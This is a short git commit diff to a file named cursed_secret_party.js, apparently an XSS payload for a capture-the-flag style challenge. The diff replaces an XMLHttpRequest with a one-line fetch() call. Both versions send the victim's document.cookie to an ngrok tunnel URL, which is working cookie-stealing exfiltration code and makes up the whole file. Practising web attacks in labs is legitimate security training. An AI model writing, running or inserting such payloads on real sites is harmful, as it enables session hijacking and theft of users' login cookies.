aa6460669f2885cce29853d5373cd980bba5a93a
Juan M. <85419418+fluwh3n@users.noreply.github.com>
2024-08-04 14:56:01 -0500

    Update cursed_secret_party.js

--- cursed_secret_party.js
+++ cursed_secret_party.js
@@ -1,3 +1,1 @@
-var request = new XMLHttpRequest();
-request.open('GET','https://48d7-38-25-15-235.ngrok-free.app/?cookie=' + document.cookie);
-request.send();
+fetch('https://b1eb-38-25-15-235.ngrok-free.app/?cookie= ' + document.cookie)
